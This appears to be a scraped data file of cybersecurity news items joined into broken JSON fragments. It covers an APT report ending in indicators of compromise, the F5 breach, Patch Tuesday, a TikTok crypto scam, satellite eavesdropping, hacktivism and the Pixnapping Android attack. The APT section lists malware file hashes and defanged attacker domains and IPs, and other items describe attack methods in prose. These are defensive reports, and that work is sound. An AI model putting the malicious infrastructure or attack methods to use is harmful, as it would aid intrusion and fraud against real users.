techniques, including wildcard DNS records, to generate unique domain names for each request. This makes it challenging for security researchers to track and monitor their activities. The attackers have also been using virtual private servers (VPS) and cloud services to host their infrastructure. This allows them to easily scale and adapt their operations to evade detection. According to our data, this APT group has utilized the services of numerous VPS providers in their operations. Nevertheless, our analysis of the statistics has revealed that Mysterious Elephant appears to have a preference for certain VPS providers.VPS providers most commonly used by Mysterious Elephant (download)VictimologyMysterious Elephant’s primary targets are government entities and foreign affairs sectors in the Asia-Pacific region. The group has been focusing on Pakistan, Bangladesh, and Sri Lanka, with a lower number of victims in other countries. The attackers have been using highly customized payloads tailored to specific individuals, highlighting their sophistication and focus on targeted attacks.The group’s victimology is characterized by a high degree of specificity. Attackers often use personalized phishing emails and malicious documents to gain initial access. Once inside, they employ a range of tools and techniques to escalate privileges, move laterally, and exfiltrate sensitive information.Most targeted countries: Pakistan, Bangladesh, Afghanistan, Nepal and Sri LankaCountries targeted most often by Mysterious Elephant (download)Primary targets: government entities and foreign affairs sectorsIndustries most targeted by Mysterious Elephant (download)ConclusionIn conclusion, Mysterious Elephant is a highly sophisticated and active Advanced Persistent Threat group that poses a significant threat to government entities and foreign affairs sectors in the Asia-Pacific region. Through their continuous evolution and adaptation of tactics, techniques, and procedures, the group has demonstrated the ability to evade detection and infiltrate sensitive systems. The use of custom-made and open-source tools, such as BabShell and MemLoader, highlights their technical expertise and willingness to invest in developing advanced malware.The group’s focus on targeting specific organizations, combined with their ability to tailor their attacks to specific victims, underscores the severity of the threat they pose. The exfiltration of sensitive information, including documents, pictures, and archive files, can have significant consequences for national security and global stability.To counter the Mysterious Elephant threat, it is essential for organizations to implementrobust security measures, including regular software updates,network monitoring, andemployee training. Additionally, international cooperation and information sharing among cybersecurity professionals, governments, and industries are crucial in tracking and disrupting the group’s activities.Ultimately, staying ahead of Mysterious Elephant and other APT groups requires a proactive and collaborative approach to cybersecurity. By understanding their TTPs, sharing threat intelligence, and implementing effective countermeasures, we can reduce the risk of successful attacks and protect sensitive information from falling into the wrong hands.Indicators of compromiseFile hashesMalicious documentsc12ea05baf94ef6f0ea73470d70db3b2M6XA.rar8650fff81d597e1a3406baf3bb87297f2025-013-PAK-MoD-Invitation_the_UN_Peacekeeping.rarMemLoader HidenDesk658eed7fcb6794634bbdd7f272fcf9c6STI.dll4c32e12e73be9979ede3f8fce4f41a3aSTI.dllMemLoader Edge3caaf05b2e173663f359f27802f10139Edge.exe, debugger.exe, runtime.exebc0fc851268afdf0f63c97473825ff75BabShell85c7f209a8fa47285f08b09b3868c2a1f947ff7fb94fa35a532f8a7d99181cf1Uplo Exfiltratorcf1d14e59c38695d87d85af76db9a861SXSHARED.dllStom Exfiltratorff1417e8e208cadd55bf066f28821d947ee45b465dcc1ac281378c973ae4c6a0ping.exeb63316223e952a3a51389a623eb283b6ping.exee525da087466ef77385a06d969f06c8178b59ea529a7bddb3d63fcbe0fe7af94ChromeStealer Exfiltrator9e50adb6107067ff0bab73307f5499b6WhatsAppOB.exeDomains/IPshxxps://storycentral[.]nethxxp://listofexoticplaces[.]comhxxps://monsoonconference[.]comhxxp://mediumblog[.]online:4443hxxp://cloud.givensolutions[.]online:4443hxxp://cloud.qunetcentre[.]org:443solutions.fuzzy-network[.]techpdfplugins[.]comfile-share.officeweb[.]livefileshare-avp.ddns[.]net91.132.95[.]14862.106.66[.]80158.255.215[.]45",

      "content": "Frequently asked questions about the August 2025 security incident at F5 and the release of multiple BIG-IP product patches.Update October 17:The blog has been updated to include additional Tenable product coverage details.View Change LogBackgroundTenable’s Research Special Operations (RSO) team has compiled this blog to answer Frequently Asked Questions (FAQ) regarding a recently disclosed security incident affecting F5. Alongside the disclosure of the security incident, F5 also released its October 2025 Quarterly Security Notification.FAQWhat is the F5 Security Incident?StartingAugust9,2025, F5 learned that a nation-state threat actor gained and maintained access to certain systems within their environment. This included access to F5’s BIG-IP product development systems and “engineering knowledge management platforms.” On October 15, F5 released knowledge base (KB)article K000154696providing current details on the known impacts of the breach, including an acknowledgement that they have not observed further unauthorized activity and believe they have successfully contained the breach.What data was stolen in this breach?According to F5, files from their BIG-IP engineering knowledge management systems and product development environments were accessed by the threat actor. The stolen data included details on undisclosed security vulnerabilities that were currently being investigated by F5 as well as source code for its BIG-IP product.What is the risk of undisclosed vulnerability data being stolen?With access to vulnerability reports and source code, the threat actor could use that information to develop exploits for issues that have not yet been patched or remediated. While F5 states they “have no knowledge of undisclosed critical or remote code vulnerabilities, and we are not aware of active exploitation of any undisclosed F5 vulnerabilities,” the risk remains that the attackers could use the stolen data to identify other vulnerabilities.Was any source code modified? Is there a risk of a supply-chain attack?According to F5, they have “no evidence of modification” to its supply chain, source code, including NGINX source code, build and release pipelines and the F5 Distributed Cloud Services or Silverline systems. These findings have reportedly been independently verified by two security research firms, NCC Group and IOActive.What are the vulnerabilities associated with the breach?At this time, F5 has not indicated that any vulnerabilities were exploited by the threat actor in order to gain access to their systems. However, on October 15, in conjunction with its security incident notice, F5 released several patches in KB articleK000156572: Quarterly Security Notification (October 2025). While there is no notice in these security advisories that any of the CVEs have been exploited, we strongly recommend applying all available patches.Additionally, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) released emergency directive (ED)26-01: Mitigate Vulnerabilities in F5 Deviceson October 15, which includes recommendations to apply all available updates. While the ED is aimed at Federal Civilian Executive Branch (FCEB) agencies, the guidance should be applicable to any organization with F5 devices or software in their environment.What actions should I take if my environment contains F5 software/devices?According to both F5 and the CISA ED, inventorying and updating all affected BIG-IP instances is of utmost importance. While it’s always recommended that security updates are applied quickly, in light of the breach, F5 urges “updating your BIG-IP software as soon as possible.” In addition, guidance from CISA suggests hardening any public facing BIG-IP devices and removing any unsupported devices from your network.Which threat actors are responsible for this attack?While no specific threat actor has been linked to the F5 breach, F5 says this incident involved a “highly sophisticated” nation-state threat actor.Are patches or mitigations available for the F5 October Quarterly Security Notification?Yes, F5 released its quarterly security notification for October 15, which includes fixes for the following products:BIG-IP (All Modules):F5 KB ArticleAssociated CVEsK000151902CVE-2025-53868K000139514CVE-2025-60016K000150614CVE-2025-48008K000150637CVE-2025-59781K000151309CVE-2025-61951K000151611CVE-2025-46706K000156707CVE-2025-53856K000156733CVE-2025-61974K000156746CVE-2025-58071K000156912CVE-2025-61990K000156691CVE-2025-58096K000156642CVE-2025-59481K000154647CVE-2025-61958K000151308CVE-2025-59269K000151658CVE-2025-58153K000156800CVE-2025-59483K90301300CVE-2025-59268K000156801CVE-2025-54755K000151297CVE-2025-58424F5OS-AF5 KB ArticleAssociated CVEsK000156767CVE-2025-61955K000156771CVE-2025-57780K000149820CVE-2025-47150K000156796CVE-2025-60015K000154661CVE-2025-60013K000148625CVE-2025-53860F5OS-CF5 KB ArticleAssociated CVEsK000156767CVE-2025-61955K000156771CVE-2025-57780K000151718CVE-2025-59778K000149820CVE-2025-47150K000156796CVE-2025-60015BIG-IP Product SpecificProductF5 KB ArticleAssociated CVEsBIG-IP APMK000156741K000156597K000156602K44517780K000148816K000156596CVE-2025-53521CVE-2025-61960CVE-2025-54854CVE-2025-53474CVE-2025-47148CVE-2025-61933Advanced WAF/ASMK000156624K000156621K000154664K000150752K000148512CVE-2025-61938CVE-2025-54858CVE-2025-61935CVE-2025-55669CVE-2025-58474SSL OrchestratorK000150667K000151368K000148816CVE-2025-41430CVE-2025-55036CVE-2025-47148BIG-IP PEMK000151475CVE-2025-54479BIG-IP AFMK000152341K000150010*CVE-2025-59478*This KB article represents a BIG-IP AFM Security Exposure and is not associated with a CVE.BIG-IP NextProductF5 KB ArticleAssociated CVEsBIG-IP Next SPKK000139514K000150614K000151611K000156623K000156733K000156912K000154614K000151596CVE-2025-60016CVE-2025-48008CVE-2025-46706CVE-2025-58120CVE-2025-61974CVE-2025-61990CVE-2025-55670CVE-2025-54805BIG-IP Next CNFK000139514K000150614K000150637K000151475K000151611K000156623K000156733K000156746K000156912K000154614K000151596CVE-2025-60016CVE-2025-48008CVE-2025-59781CVE-2025-54479CVE-2025-46706CVE-2025-58120CVE-2025-61974CVE-2025-58071CVE-2025-61990CVE-2025-55670CVE-2025-54805BIG-IP Next for KubernetesK000151475K000156623K000156733K000156746K000156912K000154614K000151596CVE-2025-54479CVE-2025-58120CVE-2025-61974CVE-2025-58071CVE-2025-61990CVE-2025-55670CVE-2025-54805Other F5 ProductsProductF5 KB ArticleAssociated CVEsNGINX App Protect WAFK000148512CVE-2025-58474F5 SilverlineK000156733K000151297CVE-2025-61974CVE-2025-58424Has Tenable released any product coverage for these vulnerabilities?A list of Tenable plugins for these vulnerabilities can be found on the individual CVE pages as they’re released:CVE-2025-53868CVE-2025-60016CVE-2025-48008CVE-2025-59781CVE-2025-61951CVE-2025-46706CVE-2025-53856CVE-2025-61974CVE-2025-58071CVE-2025-61990CVE-2025-58096CVE-2025-59481CVE-2025-61958CVE-2025-59269CVE-2025-58153CVE-2025-59483CVE-2025-59268CVE-2025-54755CVE-2025-58424CVE-2025-61955CVE-2025-57780CVE-2025-47150CVE-2025-60015CVE-2025-60013CVE-2025-53860CVE-2025-59778CVE-2025-53521CVE-2025-61960CVE-2025-54854CVE-2025-53474CVE-2025-47148CVE-2025-61933CVE-2025-61938CVE-2025-54858CVE-2025-61935CVE-2025-55669CVE-2025-58474CVE-2025-41430CVE-2025-55036CVE-2025-54479CVE-2025-59478CVE-2025-58120CVE-2025-55670CVE-2025-54805This link will display all available plugins for these vulnerabilities, including upcoming plugins in ourPlugins Pipeline.Additionally, customers can utilize Tenable Attack Surface Management to identify public facing F5 devices by using the following subscriptions:Were Tenable products impacted?No, no Tenable products or systems have been impacted by theSecurity Incidentreported by F5 on October 15, 2025, nor by the vulnerabilities detailed in F5'sQuarterly Security Notification(October 2025) published on that date.Change LogUpdate October 17:The blog has been updated to include additional Tenable product coverage details.Get more informationF5:K000154696: F5 Security IncidentF5:K000156572: Quarterly Security Notification (October 2025)CISA:ED 26-01: Mitigate Vulnerabilities in F5 DevicesJoinTenable's Research Special Operations (RSO) Teamon Tenable Connect and engage with us in theThreat Roundtable groupfor further discussions on the latest cyber threats.Learn more aboutTenable One, the Exposure Management Platform for the modern attack surface.",

      "content": "The true cost of cyber risk is a human one. Siloed tools and disjointed operations aren’t just endangering your business, they’re also taking a real toll on your teams. It’s long past time to take the friction out of cybersecurity with a unified, proactive approach.Key takeaways:Security teams are overwhelmed by the number of tools, manual processes, and volume of data required to do their jobs.While organizations struggle to get a clear picture of risk, attackers see a map of attack paths.Exposure managementtakes the friction out of cybersecurity, empowering your teams to focus on proactively defending your environment.While we often talk about cyber risk in business terms, the impact of a cyber attack ultimately affects people’s lives. Think of patients who can’t get life-saving medical treatments because their hospital suffered a ransomware attack. Passengers stranded at airports. Families that can’t close on new homes. The financial and emotional costs associated with fraud and identity theft. People ultimately pay the price for all of these outcomes in one way or another.Those on the frontlines of your cyber defenses are acutely aware of the human toll of cyber risk. And they’re paying a price too.Security teams are burning out. They are staffed with brilliant, dedicated experts in cloud, OT, and IT but are forced to work in silos. The cloud admin is overwhelmed. The OT engineer is terrified of a production shutdown caused by an ill-timed patch. The vulnerability management team is drowning in “critical” alerts. The results? Friction, wasted efforts, and a constant fear that the real, business-ending threat is lurking in the gaps.Here’s a look at the scope of the challenges security teams are dealing with:Up to83security tools from29vendorseach requiringone or more data connectors300,000CVEs tracked by MITRE since inceptioninstances of unpatched vulnerabilities projected to reach515 billionby year’s end1670OT-impacting vulnerabilitiesdisclosed in first-half 2025AI everywhere —89%of orgs are either using AI or piloting it34%have suffered an AI-related breachDynamic cloud environments —82%work inhybrid cloud environments63%juggle two or more cloud providersI could go on, but you get the picture. When they most need clarity, teams are hobbled by fractured visibility, disjointed action, and uncertainty. Managing vulnerabilities and exposures across all the silos of IT, OT, cloud, AI, and beyond remains far too complex and manual. Teams spend hours — sometimes days — consolidating reports, correlating vulnerabilities, assigning remediation tasks, and trying to figure out what it all means for their organization’s overall risk exposure. They lack a way to connect, unify, and analyze the flood of security data they’re facing on a daily basis.And when a CEO or board of directors asks a CISO, “Are we exposed?” too often there’s no confident, data-backed answer.Security teams and the executives they report to are drowning in data, but starving for clarity.Disjointed defense performed by overwhelmed and dispirited teams is the attacker’s greatest advantage. While your teams struggle to work across silos and get a clear picture of risk, attackers see one interconnected landscape of opportunity in your environment. By chaining together seemingly unrelated weaknesses between vulnerability management, identities, cloud, and operational technology (OT), they build a navigable map of your environment with attack paths your teams simply can’t see from inside their functional silos. Threat actors are waging a unified campaign against your scattered defenses.Don’t your cyber defenders deserve a unified front?Cybersecurity isn’t won by individual heroes fighting isolated battles. It’s won with a united front, capable of seeing the entire battlefield as clearly as the enemy does. That’s whereexposure managementcomes in.Exposure management is a strategic approach to proactive security designed to unify siloed teams, tools, and data. It gives IT and security teams the ability to see the entire attack surface, so they can home in on the greatest threats to your business. With exposure management, you get:A single, unified view of the attack surfaceA single, consolidated source of security dataA consistent approach to risk scoring across security domainsCapabilities to prioritize and remediate exposures based on business impact and technical contextTogether, these capabilities empower you to see how seemingly disparate vulnerabilities, misconfigurations, and excessive permissions combine to create attack paths leading to your organization’s most critical systems and data. With this visibility and insight, you can proactively cut off these exposures at the pass.See the wayexposure management has transformed Tenable’s own security team.Cybersecurity burnout is a business riskALancaster Universitystudy ofresponsible cybersecurityemphasizes the wellbeing of the people in cybersecurity roles as a key consideration in an organization's security strategy. Study participants reported a high level of burnout, which the researchers say presents risks not only to the individuals but to their organizations and society at large.It’s long past time to take the friction out of cybersecurity. Your teams deserve a new approach that reduces noise, gives them accurate prioritization guidance, and helps them to reduce risk without burning themselves out. Exposure management gives your teams the strategy and structure, along with the visibility, insight, and action, to join forces and present a unified front.1Source: Tenable Research estimate based on telemetry scan data.Learn moreGet ahead of cyber threats withexposure management.",
      "summary": "The article highlights the significant human cost associated with cyber risk, emphasizing that security teams are overwhelmed by numerous tools, manual processes, and data volumes. The lack of a unified approach to cybersecurity leads attackers to exploit vulnerabilities across different domains, creating interconnected attack paths that remain unseen by the teams responsible for defending the organization. This disjointed defense strategy benefits the adversaries more than it does the organizations themselves. To combat this issue, exposure management is advocated as a strategic approach to proactive security, aiming to unify siloed teams, tools, and data. By providing a single unified view of the attack surface, a consolidated source of security data, and capabilities for prioritizing and remediating exposures based on business impact, exposure management empowers IT and security teams to proactively defend their organization against cyber threats. This approach not only reduces friction in cybersecurity but also supports the wellbeing of the individuals involved, reducing burnout and promoting a more effective and sustainable defense posture.",

      "published_date": "2025-10-15",
      "content": "This scam starts in your TikTok DMs. A brand-new account drops a melodramatic message—terminal illness, last goodbye, “I left you some assets.” At the bottom: a ready-made username and password for a crypto site you’ve never used. It’s designed to feel urgent and personal so you tap before you think. The whole funnel is built for phones: big tap targets, short copy, sticky chat bubbles—perfect for someone arriving straight from TikTok.Thanks to our community for spotting this one. This exact scam was shared on ourMalwarebytes subredditby user Ok-Internal-2110, who posted a warning for TikTok users after encountering it firsthand.I walked through the flow so you don’t have to.What the site shows vs. what actually existsThe illusion:The moment you log in with the credentials from that TikTok DM, a glossy, mobile-friendly dashboard flashes a huge balance. There’s motion (numbers “update”), a believable “history,” and a bigWithdrawbutton right where your thumb expects it. On a small screen, it looks like a real account with real money.The trap:When you try to send that balance to your own wallet, the site asks for a withdrawal key belonging to the original account holder—the one from the DM. You don’t have that key, and support won’t give it to you. External withdrawals are a dead end by design.The detour they push you to take:Support suggests usingInternal Transferinstead. Conveniently, they also offer to help you create a new user “in seconds,” and this new accountwillhave its own key (because you created it). That makes it feel like you’re finally doing something legitimate: “I’ll just transfer the funds to my new account and then withdraw.”The paywall you only meet once you’re invested:Internal transfers only work on “VIP” accounts. To upgrade to VIP, you must pay for a membership. Many victims pay here, assuming it’s a one-time hurdle before they can finally withdraw.Why nothing real ever leaves the site:After you upgrade and attempt the internal transfer, the site can:demand another fee (a “limit lift,” “tax,” or “security key”),fail silently and push you to support, or“complete” the transfer inside the fake ledger while still blocking any external withdrawal.Victims end uppaying for the privilege of moving fake numbers between fake accounts—then paying again to “unlock” a withdrawal that never happens.The scam in a nutshellThis scam is built for volume. DMs and comments via a huge platform like TikTok seed the same gift-inheritance story to thousands of people at once.Two things do the heavy lifting:Shock value: That huge, unexpected number on the dashboard delivers a little jolt of surprise mixed with excitement, which lowers skepticism and pushes you into fast, emotional decision-making.Foot-in-the-door: Small steps (log in > try withdraw > hit a roadblock > “just upgrade to VIP”) nudge you toward paying a fee that now feels reasonable.With borrowed authenticity from a big on-screen balance, the scammers sell you VIP access to move that fake balance around internally while keeping you forever one step away from a real, on-chain withdrawal.Why do people keep paying up?The balancelooksreal, so every new hurdle feels like bureaucracy, not fraud.Paying once creates sunk cost: “I’ve already invested—one more step and I’m done.”Internal movements inside their dashboard mimic progress, even though no on-chain transfer ever occurs.A mobile flow encourages momentum—it’s always “one more tap” to finish.Any system that makes youpay to receive money that allegedly already belongs to youis likely to be a scam.The part most people miss is that you’re also handing over personal data. Even if you never send crypto, the site and the chat funnel collect a surprising amount of information, including your name, email, and phone number.That data is valuable on its own and makes follow-up scams easier. Phishing that references the earlier “account,” extortion threats, fake “refund” offers that ask for remote access, SIM-swap attempts tied to your number, or simple resale of your details to other crews—and sadly, getting hooked once increases the odds you’ll be targeted again.How to recognize this family of scamsYou’re asked to log into a site with credentials someone else gave you.A big balance appears instantly, but external withdrawals require a mystery key or never complete.You’re told internal transfers are possible only after buying VIP or a membership.The support bubble is quick to reply about upgrades and silent about on-chain withdrawals.Any “proof” of funds exists only inside their dashboard—no public ledger, no small test withdrawal.How to stay safeThere are safer ways to test claims (without losing money):Never pay to “unlock” money.If funds are yours, you don’t buy permission to move them.Ask for on-chain proof.Real balances live on a public ledger. If they can’t show it, it doesn’t exist.Attempt a tiny withdrawal firstto a wallet you control—on legitimate platforms, that’s routine after verifying your identity (know you customer, or KYC) and enabling two-factor authentication (2FA).Search the flow, not just the brand.Scam kits change names and domains, but the “VIP to withdraw” mechanic stays the same.What to do if you already engaged:Stop sending funds.The next fee is not the last fee.Lock down accounts:change passwords, enable 2FA, reset app passwords, and review recovery phone/email.Reduce future targeting:consider a new email/number for financial accounts and remove your number from public profiles.Document everything(screenshots, timestamps, any wallet addresses or TXIDs if you paid).Reportthe TikTok account and the website, and file with your local cybercrime or consumer-protection channel.Tell someone close to you.Shame keeps people quiet; silence helps the scammers.If a platform says there’s a pile of crypto waiting for you but you must buy VIP to touch it, you’re not withdrawing funds; you’re buying a story. TikTok brings you in on your phone; the mobile UI keeps you tapping. Close the tab, report the DM, and remember: dashboards can be faked, public ledgers can’t.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline.

      "summary": "The TikTok scam described is a sophisticated phishing attack that targets users through direct messages (DMs) on the platform, aiming to trick them into accessing a fake cryptocurrency account with phony funds. The scam uses emotional storytelling and urgent messaging to create a sense of urgency, leading users to log in using provided credentials. Once inside the trap, users are presented with an illusion of real funds but find that they cannot withdraw these funds without additional fees or information from the original account holder, which is unobtainable. This setup creates a loop where users are encouraged to pay more fees and eventually upgrade their accounts to VIP status in order to continue the process, all while never actually gaining access to any real money.\n\nThe scam's success relies on several factors including emotional manipulation through dramatic narratives, immediate action pressure due to mobile-friendly interfaces, and a user experience designed for quick taps that reduces cognitive effort to engage. Moreover, by collecting personal data during the process, scammers can exploit this information in future scams or attempts at extortion. The implications of such attacks are significant as they not only target financial losses but also lead to potential identity theft and further exploitation through follow-up scams.",

      "content": "Scientists from several US universities intercepted unencrypted broadcast through geostationary satellites using only off-the-shelf equipment on a university rooftop.Geostationary satellites move at the same speed as the Earth’s rotation so it seems as though they are always above the same exact location. To maintain this position, they orbit at an altitude of roughly 22,000 miles (36,000 kilometers).This makes them ideal for relaying phone calls, text messages, and internet data. Since these satellites can cover vast areas—including remote and hard-to-reach areas—they provide reliable connectivity for everything from rural cell towers to airplanes and ships, even where cables don’t reach.That same stability makes them convenient for people who want to eavesdrop, because you only need to point your equipment once. The researchers who did this described their findings in a paper called “Don’t Look Up: There Are Sensitive Internal Links in the Clear on GEO Satellites.”The team scanned the IP traffic on 39 GEO satellites across 25 distinct longitudes with 411 transponders using consumer-grade equipment. About half of the signals they captured contained clear text IP traffic.This means there was no encryption at either the link layer or the network layer. This allowed the team to observe internal communications from organizations that rely on these satellites to connect remote critical infrastructure and field operations.Among the intercepted data were private voice calls, text messages, and call metadata sent through cellular backhaul—the data that travels between cell towers and the central network.Commercial and retail organizations transmitted inventory records, internal communications, and business data over these satellite links. Banks leaked ATM-related transactions and network management commands. Entertainment and aviation communications were also intercepted, including in-flight entertainment audio and aircraft data.The researchers also captured industrial control signals for utility infrastructure, including job scheduling and grid monitoring commands. Military (from the US and Mexico) communications were exposed, revealing asset tracking information and operational details such as surveillance data for vessel movements.The research reveals a pervasive lack of standardized encryption protocols, leaving much of this traffic vulnerable to interception by any technically capable individual with suitable equipment. They concluded that despite the sensitive nature of the data, satellite communication security is often neglected, creating substantial opportunities for eavesdropping, espionage, and potential misuse.The researchers stated:“There is a clear mismatch between how satellite customers expect data to be secured and how it is secured in practice; the severity of the vulnerabilities we discovered has certainly revised our own threat models for communications.”After the scientists reported their findings, T-Mobile took steps to address the issue, but other unnamed providers have yet to patch the vulnerabilities.This study highlights the importance of making sure your communications are encrypted before they leave your devices. Do not rely solely on providers to keep your data safe. Use secure communication apps like Signal or WhatsApp, choose voice-over-internet (VoIP) providers that encrypt calls and messages, and protect your internet data with aVPNthat creates a secure, encrypted tunnel.We don’t just report on privacy—we offer you the option to use it.Privacy risks should never spread beyond a headline.

      "content": "Microsofttoday released software updates to plug a whopping 172 security holes in itsWindowsoperating systems, including at least two vulnerabilities that are already being actively exploited. October’s Patch Tuesday also marks the final month that Microsoft will ship security updates forWindows 10systems. If you’re running a Windows 10 PC and you’re unable or unwilling to migrate toWindows 11, read on for other options.The first zero-day bug addressed this month (CVE-2025-24990) involves a third-party modem driver called Agere Modem that’s been bundled with Windows for the past two decades. Microsoft responded to active attacks on this flaw by completely removing the vulnerable driver from Windows.The other zero-day isCVE-2025-59230, an elevation of privilege vulnerability inWindows Remote Access Connection Manager(also known asRasMan), a service used to manage remote network connections through virtual private networks (VPNs) and dial-up networks.“While RasMan is a frequent flyer on Patch Tuesday, appearing more than 20 times since January 2022, this is the first time we’ve seen it exploited in the wild as a zero day,” saidSatnam Narang, senior staff research engineer atTenable.Narang notes thatMicrosoft Officeusers should also take note ofCVE-2025-59227andCVE-2025-59234, a pair of remote code execution bugs that take advantage of “Preview Pane,” meaning that the target doesn’t even need to open the file for exploitation to occur. To execute these flaws, an attacker would social engineer a target into previewing an email with a malicious Microsoft Office document.Speaking of Office, Microsoftquietly announced this weekthatMicrosoft Wordwill now automatically save documents to OneDrive, Microsoft’s cloud platform. Users who are uncomfortable saving all of their documents to Microsoft’s cloud can change this in Word’s settings; ZDNet hasa useful how-toon disabling this feature.Kev Breen, senior director of threat research atImmersive, called attention toCVE-2025-59287, a critical remote code execution bug in the Windows Server Update Service  (WSUS) — the very same Windows service responsible for downloading security patches for Windows Server versions. Microsoft says there are no signs this weakness is being exploited yet. But with a threat score of 9.8 out of possible 10 and marked “exploitation more likely,” CVE-2025-59287 can be exploited without authentication and is an easy “patch now” candidate.“Microsoft provides limited information, stating that an unauthenticated attacker with network access can send untrusted data to the WSUS server, resulting in deserialization and code execution,” Breen wrote. “As WSUS is a trusted Windows service that is designed to update privileged files across the file system, an attacker would have free rein over the operating system and could potentially bypass some EDR detections that ignore or exclude the WSUS service.”For more on other fixes from Redmond today, check out theSANS Internet Storm Centermonthly roundup, which indexes all of the updates by severity and urgency.Windows 10 isn’t the only Microsoft OS that is reaching end-of-life today;Exchange Server 2016,Exchange Server 2019,Skype for Business 2016,Windows 11 IoT Enterprise Version 22H2, andOutlook 2016are some of the other products that Microsoft is sunsetting today.If you’re running any Windows 10 systems, you’ve probably already determined whether your PC meets the technical hardware specs recommended for the Windows 11 OS. If you’re reluctant or unable to migrate a Windows 10 system to Windows 11, there are alternatives to simply continuing to use Windows 10 without ongoing security updates.One option is to pay for another year’s worth of security updates throughMicrosoft’s Extended Security Updates(ESU) program. The cost is just $30 if you don’t have a Microsoft account, and apparently free if you register the PC to a Microsoft account. Thisvideo breakdownfromAsk Your Computer Guydoes a good job of walking Windows 10 users through this process. Microsoft emphasizes that ESU enrollment does not provide other types of fixes, feature improvements or product enhancements. It also does not come with technical support.If your Windows 10 system is associated with a Microsoft account and signed in when you visit Windows Update, you should see an option to enroll in extended updates. Image: https://www.youtube.com/watch?v=SZH7MlvOoPMWindows 10 users also have the option of installing some flavor of Linux instead. Anyone seriously considering this option should check out the websiteendof10.org, which includes a plethora of tips and a DIY installation guide.Linux Mintis a great option for Linux newbies. Like most modern Linux versions, Mint will run on anything with a 64-bit CPU that has at least 2GB of memory, although 4GB is recommended. In other words, it will run on almost any computer produced in the last decade.Linux Mint also is likely to be the most intuitive interface for regular Windows users, and it is largely configurable without any fuss at the text-only command-line prompt. Mint and other flavors of Linux come withLibreOffice, which is an open source suite of tools that includes applications similar to Microsoft Office, and it can open, edit and save documents as Microsoft Office files.If you’d prefer to give Linux a test drive before installing it on a Windows PC, you can always just download it to a removable USB drive. From there, reboot the computer (with the removable drive plugged in) and select the option at startup to run the operating system from the external USB drive. If you don’t see an option for that after restarting, try restarting again and hitting the F8 button, which should open a list of bootable drives.Here’s a fairly thorough tutorialthat walks through exactly how to do all this.And if this is your first time trying out Linux, relax and have fun: The nice thing about a “live” version of Linux (as it’s called when the operating system is run from a removable drive such as a CD or a USB stick) is that none of your changes persist after a reboot. Even if you somehow manage to break something, a restart will return the system back to its original state.As ever, if you experience any difficulties during or after applying this month’s batch of patches, please leave a note about it in the comments below.",

      "content": "What do hacktivist campaigns look like in 2025? To answer this question, we analyzed more than 11,000 posts produced by over 120 hacktivist groups circulating across both the surface web and the dark web, with a particular focus on groups targeting MENA countries. The primary goal of our research is to highlight patterns in hacktivist operations, including attack methods, public warnings, and stated intent. The analysis is undertaken exclusively from a cybersecurity perspective and anchored in the principle of neutrality.Hacktivists are politically motivated threat actors who typically value visibility over sophistication. Their tactics are designed for maximum visibility, reach, and ease of execution, rather than stealth or technical complexity. The term “hacktivist” may refer to either the administrator of a community who initiates the attack or an ordinary subscriber who simply participates in the campaign.Key findingsWhile it may be assumed that most operations unfold on hidden forums, in fact, most hacktivist planning and mobilization happens in the open. Telegram has become the command center for today’s hacktivist groups, hosting the highest density of attack planning and calls to action. The second place is occupied by X (ex-Twitter).Distribution of social media references in posts published in 2025Although we focused on hacktivists operating in MENA, the targeting of the groups under review is global, extending well beyond the region. There are victims throughout Europe and Middle East, as well as Argentina, the United States, Indonesia, India, Vietnam, Thailand, Cambodia, Türkiye, and others.Hashtags as the connective tissue of hacktivist operationsOne notable feature of hacktivist posts and messages on dark web sites is the frequent use of hashtags (#words). Used in their posts constantly, hashtags often serve as political slogans, amplifying messages, coordinating activity or claiming credit for attacks. The most common themes are political statements and hacktivist groups names, though hashtags sometimes reference geographical locations, such as specific countries or cities.Hashtags also map alliances and momentum. We have identified 2063 unique tags in 2025: 1484 appearing for the first time, and many tied directly to specific groups or joint campaigns. Most tags are short-lived, lasting about two months, with “popular” ones persisting longer when amplified by alliances; channel bans contribute to attrition.Operationally, reports of completed attacks dominate hashtagged content (58%), and within those, DDoS is the workhorse (61%). Spikes in threatening rhetoric do not by themselves predict more attacks, but timing matters: when threats are published, they typically refer to actions in the near term, i.e. the same week or month, making early warning from open-channel monitoring materially useful.The full version of the report details the following findings:How long it typically takes for an attack to be reported after an initial threat postHow hashtags are used to coordinate attacks or claim creditPatterns across campaigns and regionsThe types of cyberattacks being promoted or celebratedPractical takeaways and recommendationsFor defenders and corporate leaders, we recommend the following:Prioritize scalable DDoS mitigation and proactive security measures.Treat public threats as short-horizon indicators rather than long-range forecasts.Invest in continuous monitoring across Telegram and related ecosystems to discover alliance announcements, threat posts, and cross-posted “proof” rapidly.Even organizations outside geopolitical conflict zones should assume exposure: hacktivist campaigns seek reach and spectacle, not narrow geography, and hashtags remain a practical lens for separating noise from signals that demand action.To download the full report, please fill in the form below.",

      "content": "Dan Goodin, Ars Technica\nSecurity\nOct 14, 2025 5:40 PM\nA New Attack Lets Hackers Steal 2-Factor Authentication Codes From Android Phones\nThe malicious app required to make a “Pixnapping” attack work requires no permissions.\nPhotograph: Vadym Plysiuk/Getty Images\nSave Story\nSave this story\nSave Story\nSave this story\nAndroid devices are\nvulnerable to a new attack that can covertly steal two-factor authentication codes, location timelines, and other private data in less than 30 seconds.\nThe new attack, named Pixnapping by the team of academic researchers who devised it, requires a victim to first install a malicious app on an Android phone or tablet. The app, which requires no system permissions, can then effectively read data that any other installed app displays on the screen. Pixnapping has been demonstrated on Google Pixel phones and the Samsung Galaxy S25 phone and likely could be modified to work on other models with additional work. Google released mitigations last month, but the researchers said a modified version of the attack works even when the update is installed.\nLike Taking a Screenshot\nPixnapping attacks begin with the malicious app invoking Android programming interfaces that cause the authenticator or other targeted apps to send sensitive information to the device screen. The malicious app then runs graphical operations on individual pixels of interest to the attacker. Pixnapping then exploits a\nside channel\nthat allows the malicious app to map the pixels at those coordinates to letters, numbers, or shapes.\n“Anything that is visible when the target app is opened can be stolen by the malicious app using Pixnapping,” the researchers wrote on an\ninformational website\n. “Chat messages, 2FA codes, email messages, etc. are all vulnerable since they are visible. If an app has secret information that is not visible (e.g., it has a secret key that is stored but never shown on the screen), that information cannot be stolen by Pixnapping.”\nThe new attack class is reminiscent of\nGPU.zip\n, a 2023 attack that allowed malicious websites to read the usernames, passwords, and other sensitive visual data displayed by other websites. It worked by exploiting side channels found in GPUs from all major suppliers. The vulnerabilities that GPU.zip exploited have never been fixed. Instead, the attack was blocked in browsers by limiting their ability to open iframes, an HTML element that allows one website (in the 